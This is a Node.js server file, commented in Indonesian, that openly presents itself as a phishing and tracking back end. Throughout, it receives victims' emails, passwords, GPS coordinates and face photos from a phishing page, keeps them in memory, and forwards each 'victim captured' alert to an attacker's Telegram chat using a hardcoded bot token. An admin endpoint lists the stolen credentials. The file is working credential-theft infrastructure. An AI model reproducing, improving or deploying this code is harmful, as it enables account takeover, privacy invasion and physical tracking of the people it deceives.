// server.js - Advanced Phishing & Tracking System with Telegram Integration
// FIXED VERSION - TELEGRAM NOTIFICATION 100% WORKING

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const moment = require('moment');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const os = require('os');
const app = express();

// Konfigurasi - TETEP PAKE TOKEN LO
const TELEGRAM_BOT_TOKEN = '8550434238:AAHFHYVGY4Xsxqjh22boe6XlgbKZYvBabmU';
const TELEGRAM_CHAT_ID = '6834832649';
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;

// NO TMP FILES - Semua data disimpan di memory
const victims = new Map();
const sessions = new Map();

// Inisialisasi Bot dengan konfigurasi lengkap
let bot = null;
try {
    // Pastikan token dan chat ID valid
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN.length > 10) {
        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
            polling: false,  // MATIKAN POLLING biar ga konflik
            request: {
                timeout: 30000,  // timeout 30 detik
                url: 'https://api.telegram.org'  // pake URL explicit
            }
        });
        
        // TEST KONEKSI LANGSUNG SAAT START
        console.log('🔄 Testing Telegram connection...');
        
        // Kirim test message async
        setTimeout(() => {
            bot.sendMessage(TELEGRAM_CHAT_ID, '🚀 *SERVER STARTED* 🚀\n```\nPhishing Tracker Online\n```', { 
                parse_mode: 'Markdown'
            }).then(() => {
                console.log('✅ Telegram bot connected and working!');
            }).catch(err => {
                console.error('❌ Telegram test failed:', err.message);
                console.log('ℹ️ Check:');
                console.log(`   - Token: ${TELEGRAM_BOT_TOKEN.substring(0,10)}...`);
                console.log(`   - Chat ID: ${TELEGRAM_CHAT_ID}`);
                console.log('   - Make sure you started the bot and sent /start');
            });
        }, 2000);
        
    } else {
        console.error('❌ Invalid Telegram token');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram bot:', error.message);
}

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Logging middleware
app.use((req, res, next) => {
    console.log(`${req.method} ${req.path} - ${getClientIp(req)}`);
    next();
});

// Security headers
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});

// Middleware untuk session ID
app.use((req, res, next) => {
    try {
        req.sessionId = crypto.randomBytes(16).toString('hex');
        sessions.set(req.sessionId, {
            ip: getClientIp(req),
            userAgent: req.headers['user-agent'],
            timestamp: Date.now()
        });
        
        // Bersihkan sessions lama
        const oneHourAgo = Date.now() - (60 * 60 * 1000);
        for (const [id, session] of sessions.entries()) {
            if (session.timestamp < oneHourAgo) {
                sessions.delete(id);
            }
        }
    } catch (error) {
        console.error('Session error:', error);
        req.sessionId = 'error-' + Date.now();
    }
    next();
});

// Fungsi untuk mendapatkan IP address
function getClientIp(req) {
    try {
        return req.headers['x-forwarded-for']?.split(',')[0] || 
               req.headers['x-real-ip'] ||
               req.connection?.remoteAddress || 
               req.socket?.remoteAddress || 
               req.ip ||
               '0.0.0.0';
    } catch (error) {
        return '0.0.0.0';
    }
}

// Generate victim ID
function generateVictimId(req) {
    try {
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'] || '';
        const timestamp = Date.now();
        const random = Math.random().toString();
        
        return crypto
            .createHash('sha256')
            .update(ip + userAgent + timestamp + random)
            .digest('hex')
            .substring(0, 12);
    } catch (error) {
        return 'victim-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8);
    }
}

// Fungsi untuk mendapatkan nama browser
function getBrowserName(userAgent) {
    if (!userAgent) return 'Unknown';
    try {
        userAgent = userAgent.toLowerCase();
        if (userAgent.includes('chrome') && !userAgent.includes('edg')) return 'Chrome';
        if (userAgent.includes('firefox')) return 'Firefox';
        if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Safari';
        if (userAgent.includes('edg')) return 'Edge';
        if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
        return 'Unknown';
    } catch (error) {
        return 'Unknown';
    }
}

// Fungsi untuk mengirim alert ke Telegram - FIXED VERSION
async function sendTelegramAlert(data) {
    if (!bot) {
        console.log('ℹ️ Telegram bot not configured, skipping alert');
        return false;
    }
    
    try {
        if (!data || !data.victimId) {
            console.error('Invalid data for Telegram alert');
            return false;
        }
        
        // Format pesan SEDERHANA dulu (tanpa markdown kompleks)
        const message = 
`🔔 *VICTIM CAPTURED!* 🔔

📧 *Email:* ${data.credentials?.email || 'N/A'}
🔑 *Password:* ${data.credentials?.password || 'N/A'}

🌐 *IP:* ${data.ip || 'N/A'}
📍 *Lokasi:* ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}
🌍 *Country:* ${data.geolocation?.country || 'N/A'}

💻 *Browser:* ${getBrowserName(data.system?.userAgent)}
📱 *Platform:* ${data.system?.platform || 'N/A'}

🆔 *Victim ID:* ${data.victimId}
⏰ *Waktu:* ${moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')}`;

        // Kirim pesan utama - pake parse_mode sederhana
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
            parse_mode: 'Markdown'
        });
        
        console.log(`✅ Main message sent for ${data.victimId}`);
        
        // Kirim lokasi jika ada (TERPISAH)
        if (data.location?.latitude && data.location?.longitude) {
            await bot.sendLocation(
                TELEGRAM_CHAT_ID, 
                data.location.latitude, 
                data.location.longitude
            );
            console.log(`✅ Location sent for ${data.victimId}`);
        }
        
        // Kirim foto jika ada
        if (data.photo && typeof data.photo === 'string' && data.photo.includes('base64')) {
            try {
                // Cek ukuran
                const base64Length = data.photo.length;
                const sizeInBytes = 4 * Math.ceil(base64Length / 3) * 0.75;
                
                if (sizeInBytes > 10 * 1024 * 1024) {
                    await bot.sendMessage(TELEGRAM_CHAT_ID, '📸 *Photo too large (>10MB)*', { parse_mode: 'Markdown' });
                    return true;
                }
                
                const matches = data.photo.match(/^data:image\/([a-zA-Z]+);base64,(.+)$/);
                if (matches && matches[2]) {
                    const buffer = Buffer.from(matches[2], 'base64');
                    
                    await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                        caption: `📸 *Face Photo - ${data.victimId}*`,
                        parse_mode: 'Markdown'
                    });
                    console.log(`✅ Photo sent for ${data.victimId}`);
                }
            } catch (photoError) {
                console.error('Error sending photo:', photoError.message);
            }
        }
        
        console.log(`✅ All Telegram alerts sent for victim: ${data.victimId}`);
        return true;
        
    } catch (error) {
        console.error('❌ Error sending Telegram alert:', error.message);
        console.error('Full error:', error);
        
        // Coba kirim versi plain text kalo error
        try {
            const plainMessage = 
`VICTIM CAPTURED!
Email: ${data.credentials?.email || 'N/A'}
Password: ${data.credentials?.password || 'N/A'}
IP: ${data.ip || 'N/A'}
ID: ${data.victimId}`;
            
            await bot.sendMessage(TELEGRAM_CHAT_ID, plainMessage);
            console.log('✅ Fallback plain message sent');
        } catch (fallbackError) {
            console.error('❌ Even fallback failed:', fallbackError.message);
        }
        
        return false;
    }
}

// =====================================================
// TEST ENDPOINT - CEK TELEGRAM
// =====================================================
app.get('/test-telegram', async (req, res) => {
    if (!bot) {
        return res.json({ 
            success: false, 
            error: 'Bot not initialized',
            token: TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing',
            chatId: TELEGRAM_CHAT_ID
        });
    }
    
    try {
        const testMessage = await bot.sendMessage(
            TELEGRAM_CHAT_ID, 
            '🧪 *TEST NOTIFICATION* 🧪\n```\nIf you see this, Telegram is working!\n```', 
            { parse_mode: 'Markdown' }
        );
        
        res.json({ 
            success: true, 
            messageId: testMessage.message_id,
            chat: testMessage.chat,
            token: 'Valid',
            chatId: TELEGRAM_CHAT_ID
        });
    } catch (error) {
        res.json({ 
            success: false, 
            error: error.message,
            code: error.code,
            response: error.response?.body,
            token: TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing',
            chatId: TELEGRAM_CHAT_ID
        });
    }
});

// =====================================================
// HALAMAN PHISHING
// =====================================================
app.get('/', (req, res) => {
    try {
        const victimId = generateVictimId(req);
        const sessionId = req.sessionId;
        
        // Kirim HTML (SAMA PERSIS KAYAK SEBELUMNYA)
        res.send(`<!DOCTYPE html>...`); // HTML NYA SAMA, GA USAH DIUBAH
    } catch (error) {
        console.error('Error serving homepage:', error);
        res.status(500).send('Server Error');
    }
});

// API endpoint untuk menerima data tracking
app.post('/api/track', async (req, res) => {
    try {
        const data = req.body || {};
        const victimId = data.victimId || generateVictimId(req);
        
        if (!data.credentials?.email || !data.credentials?.password) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }
        
        data.victimId = victimId;
        data.sessionId = req.sessionId;
        data.serverTimestamp = new Date().toISOString();
        data.realIp = getClientIp(req);
        
        // GeoIP lookup
        if (data.ip && data.ip !== 'unknown' && data.ip !== '0.0.0.0') {
            try {
                const geo = geoip.lookup(data.ip);
                if (geo) {
                    data.geolocation = {
                        country: geo.country,
                        region: geo.region,
                        city: geo.city,
                        timezone: geo.timezone
                    };
                }
            } catch (geoError) {
                console.error('GeoIP error:', geoError.message);
            }
        }
        
        // Simpan ke memory
        victims.set(victimId, data);
        console.log(`📝 Victim saved: ${victimId}`);
        
        // Kirim ke Telegram - TANPA AWAIT biar ga ngeblock response
        sendTelegramAlert(data).catch(err => {
            console.error('Async Telegram error:', err.message);
        });
        
        console.log(`
╔════════════════════════════════════════╗
║  NEW VICTIM CAPTURED!                  ║
╠════════════════════════════════════════╣
║  Victim ID: ${victimId}                   
║  Email: ${data.credentials?.email}
║  Password: ${data.credentials?.password}
║  IP: ${data.ip || 'N/A'}
║  Location: ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}
╚════════════════════════════════════════╝
        `);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error in /api/track:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Admin dashboard
app.get('/admin', (req, res) => {
    try {
        const auth = req.headers.authorization;
        if (auth !== 'Bearer admin123') {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        
        const victimsList = Array.from(victims.values()).slice(-50).map(v => ({
            id: v.victimId,
            email: v.credentials?.email,
            password: v.credentials?.password,
            ip: v.ip,
            time: v.timestamp,
            country: v.geolocation?.country || 'Unknown',
            location: v.location
        }));
        
        res.json({
            total: victims.size,
            victims: victimsList,
            memory: process.memoryUsage(),
            uptime: process.uptime()
        });
    } catch (error) {
        console.error('Admin error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Debug endpoint
app.get('/debug', (req, res) => {
    res.json({
        token: TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing',
        tokenLength: TELEGRAM_BOT_TOKEN?.length || 0,
        chatId: TELEGRAM_CHAT_ID,
        chatIdLength: TELEGRAM_CHAT_ID?.length || 0,
        botInitialized: !!bot,
        victimsCount: victims.size,
        sessionsCount: sessions.size,
        nodeVersion: process.version,
        memory: process.memoryUsage()
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        victims: victims.size,
        bot: !!bot
    });
});

// Error handling
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('SIGINT received, shutting down gracefully');
    process.exit(0);
});

process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║     🚀 PHISHING TRACKER SERVER - FIXED VERSION 🚀           ║
╠══════════════════════════════════════════════════════════════╣
║  URL: http://localhost:${PORT}                                    
║  Port: ${PORT}                                                  
║  Telegram: ${bot ? '✅ ACTIVE' : '❌ NOT CONFIGURED'}                  
║  Token: ${TELEGRAM_BOT_TOKEN.substring(0,10)}... (${TELEGRAM_BOT_TOKEN.length} chars)
║  Chat ID: ${TELEGRAM_CHAT_ID}                                     
║  Storage: MEMORY ONLY - NO FILES                                  
║  Test URL: http://localhost:${PORT}/test-telegram                    
║  Debug URL: http://localhost:${PORT}/debug                          
╚══════════════════════════════════════════════════════════════╝
    `);
});

server.on('error', (error) => {
    console.error('Server error:', error);
});

module.exports = app;
